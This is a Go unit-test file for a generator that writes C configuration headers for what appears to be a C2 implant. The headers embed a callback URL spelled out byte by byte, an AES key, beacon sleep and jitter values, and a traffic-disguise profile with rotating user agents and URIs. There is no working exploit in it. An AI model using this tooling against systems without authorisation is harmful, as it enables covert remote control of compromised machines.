package main

import (
	"strings"
	"testing"

	"nonameax/naxwire"
)

func TestGenerateConfigH(t *testing.T) {
	key := []byte{
		0x48, 0xE9, 0x5D, 0x5D, 0x85, 0xDE, 0xE1, 0x46,
		0x9F, 0x21, 0xC3, 0xBE, 0xC4, 0x63, 0xB4, 0x58,
	}
	out := string(generateConfigH("192.168.77.128", 8080, "/api/v1/status", key, 10000, 0, nil, 0xa04a4178, 0xdeadbeef, nil, false))

	checks := []string{
		"#pragma once",
		"#define NAX_SLEEP_MS    10000u",
		"#define NAX_JITTER_PCT  0u",
		"#define NAX_SID_LEN     17u",
		"#define NAX_C2_URL_WRITE( p ) do {",
		"(p)[ 0]='h';",
		"(p)[ 3]='p';",
		"#define NAX_AES_KEY_WRITE( p ) do {",
		"(p)[ 0]=0x48;",
		"(p)[15]=0x58;",
		"} while(0)",
	}
	for _, s := range checks {
		if !strings.Contains(out, s) {
			t.Errorf("output missing: %q", s)
		}
	}
}

func TestGenerateConfigH_DifferentValues(t *testing.T) {
	key := []byte{
		0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11,
		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
	}
	out := string(generateConfigH("10.0.0.1", 443, "/index.html", key, 30000, 25, nil, 0xa04a4178, 0xdeadbeef, nil, false))

	checks := []string{
		"#define NAX_SLEEP_MS    30000u",
		"#define NAX_JITTER_PCT  25u",
		"(p)[ 0]=0xAA;",
		"C2 URL:   http://10.0.0.1:443/index.html",
		"(p)[ 0]='h'; (p)[ 1]='t'; (p)[ 2]='t'; (p)[ 3]='p'; (p)[ 4]=':';",
	}
	for _, s := range checks {
		if !strings.Contains(out, s) {
			t.Errorf("output missing: %q", s)
		}
	}

	if !strings.Contains(out, "'\\0';") {
		t.Error("missing NUL terminator in URL_WRITE")
	}
}

func TestGenerateConfigH_SSL_DefaultPort(t *testing.T) {
	key := []byte{
		0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11,
		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
	}
	out := string(generateConfigH("10.0.0.1", 443, "/index.html", key, 30000, 25, nil, 0xa04a4178, 0xdeadbeef, nil, true))

	checks := []string{
		"C2 URL:   https://10.0.0.1/index.html",
		"(p)[ 0]='h'; (p)[ 1]='t'; (p)[ 2]='t'; (p)[ 3]='p'; (p)[ 4]='s'; (p)[ 5]=':';",
	}
	for _, s := range checks {
		if !strings.Contains(out, s) {
			t.Errorf("output missing: %q", s)
		}
	}
	if strings.Contains(out, ":443/") {
		t.Error("default HTTPS port 443 should be omitted from URL")
	}
}

func TestGenerateConfigH_SSL_CustomPort(t *testing.T) {
	key := []byte{
		0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11,
		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
	}
	out := string(generateConfigH("10.0.0.1", 8443, "/index.html", key, 30000, 25, nil, 0xa04a4178, 0xdeadbeef, nil, true))

	checks := []string{
		"C2 URL:   https://10.0.0.1:8443/index.html",
	}
	for _, s := range checks {
		if !strings.Contains(out, s) {
			t.Errorf("output missing: %q", s)
		}
	}
}

func TestGenerateConfigH_HTTP_DefaultPort(t *testing.T) {
	key := []byte{
		0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11,
		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
	}
	out := string(generateConfigH("10.0.0.1", 80, "/path", key, 5000, 0, nil, 0xa04a4178, 0xdeadbeef, nil, false))

	if !strings.Contains(out, "C2 URL:   http://10.0.0.1/path") {
		t.Errorf("default HTTP port 80 should be omitted from URL, got:\n%s", out)
	}
	if strings.Contains(out, ":80/") {
		t.Error("default HTTP port 80 should be omitted from URL")
	}
}

func TestGenerateConfigH_NilProfile(t *testing.T) {
	key := []byte{
		0x48, 0xE9, 0x5D, 0x5D, 0x85, 0xDE, 0xE1, 0x46,
		0x9F, 0x21, 0xC3, 0xBE, 0xC4, 0x63, 0xB4, 0x58,
	}
	out := string(generateConfigH("192.168.1.1", 8080, "/test", key, 10000, 5, nil, 0xa04a4178, 0xdeadbeef, nil, false))

	// Nil profile should NOT emit NAX_PROFILE_LEN or NAX_PROFILE_WRITE
	if strings.Contains(out, "NAX_PROFILE_LEN") {
		t.Error("nil profileBytes should not emit NAX_PROFILE_LEN")
	}
	if strings.Contains(out, "NAX_PROFILE_WRITE") {
		t.Error("nil profileBytes should not emit NAX_PROFILE_WRITE")
	}
	// But other defines should still be present
	if !strings.Contains(out, "#define NAX_SID_LEN") {
		t.Error("missing NAX_SID_LEN")
	}
}

func TestGenerateConfigH_WithProfile(t *testing.T) {
	key := []byte{
		0x48, 0xE9, 0x5D, 0x5D, 0x85, 0xDE, 0xE1, 0x46,
		0x9F, 0x21, 0xC3, 0xBE, 0xC4, 0x63, 0xB4, 0x58,
	}
	profile := []byte{0x02, 0x00, 0xAA, 0xBB, 0xCC}
	out := string(generateConfigH("192.168.1.1", 8080, "/test", key, 10000, 5, profile, 0xa04a4178, 0xdeadbeef, nil, false))

	configChecks := []string{
		"#define NAX_PROFILE_LEN  5u",
		"#include \"Config_profile.h\"",
		"#define NAX_SID_LEN     17u",
	}
	for _, s := range configChecks {
		if !strings.Contains(out, s) {
			t.Errorf("Config.h missing: %q", s)
		}
	}

	profOut := string(generateProfileH(profile))
	profChecks := []string{
		"#define NAX_PROFILE_WRITE( p ) do {",
		"(p)[  0]=0x02;",
		"(p)[  1]=0x00;",
		"(p)[  2]=0xAA;",
		"(p)[  3]=0xBB;",
		"(p)[  4]=0xCC;",
		"} while(0)",
	}
	for _, s := range profChecks {
		if !strings.Contains(profOut, s) {
			t.Errorf("Config_profile.h missing: %q", s)
		}
	}
}

func TestGenerateConfigH_ProfileFromListenerConfig(t *testing.T) {
	cfg := map[string]any{
		"user_agents": []any{"Mozilla/5.0 TestAgent"},
		"rotation":    "random",
		"get_uris":    []any{"/api/v1", "/check"},
		"post_uris":   []any{"/submit"},
		"cookie_name": "sid",
	}
	p := parseProfileFromListenerConfig(cfg)
	if p.UserAgent != "Mozilla/5.0 TestAgent" {
		t.Errorf("expected UserAgent=%q, got %q", "Mozilla/5.0 TestAgent", p.UserAgent)
	}
	if p.Rotation != "random" {
		t.Errorf("expected Rotation=%q, got %q", "random", p.Rotation)
	}
	if len(p.Get.URIs) != 2 {
		t.Errorf("expected 2 GET URIs, got %d", len(p.Get.URIs))
	}

	profileBytes := naxwire.EncodeProfileBodyV2(p)
	if len(profileBytes) == 0 {
		t.Fatal("EncodeProfileBodyV2 returned empty bytes")
	}

	key := []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10}
	out := string(generateConfigH("192.168.1.1", 8080, "/test", key, 10000, 5, profileBytes, 0xa04a4178, 0xdeadbeef, nil, false))

	if !strings.Contains(out, "#define NAX_PROFILE_LEN") {
		t.Error("missing NAX_PROFILE_LEN with real profile")
	}
	if !strings.Contains(out, "#include \"Config_profile.h\"") {
		t.Error("missing Config_profile.h include with real profile")
	}

	profOut := string(generateProfileH(profileBytes))
	if !strings.Contains(profOut, "#define NAX_PROFILE_WRITE( p ) do {") {
		t.Error("missing NAX_PROFILE_WRITE in Config_profile.h")
	}
	if !strings.Contains(profOut, "0x02") {
		t.Error("profile should start with version byte 0x02")
	}
}
